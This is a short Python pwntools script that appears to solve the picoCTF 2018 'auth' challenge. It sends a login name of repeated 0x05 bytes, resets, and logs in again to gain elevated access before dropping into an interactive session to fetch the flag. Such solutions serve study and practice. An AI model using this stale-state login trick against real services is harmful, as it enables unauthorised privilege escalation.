# !/usr/bin/python2

from pwn import *
import sys

LOCAL = True

context.arch = 'x86_64'


def info(s):
	log.info(s)


def show():
	r.sendline("show")
	data = r.readline() \
		.strip() \
		.split("as ")[1] \
		.split(" ")[1]
	r.recvuntil("> ")
	return data


def login(name):
	r.sendline("login %s" % name)
	r.recvuntil("> ")


def auth(level):
	r.sendline("set-auth %s" % level)
	r.recvuntil("> ")


def reset():
	r.sendline("reset")
	r.recvuntil("> ")


def quit():
	r.sendline("quit")


def exploit(r):
	r.recvuntil("> ")

	login(p8(0x5) * 0x9)
	reset()
	login("NEW")
	print show()
	# run get-flag

	r.interactive()
	return

if __name__ == '__main__':
    
	# e = ELF('./auth')
	HOST , PORT = "2018shell2.picoctf.com",26847
	if len(sys.argv) > 1:
		r = remote(HOST,PORT)
		exploit(r)
	else:
		r = process(['./auth'])
		print util.proc.pidof(r)
		pause()
		exploit(r)
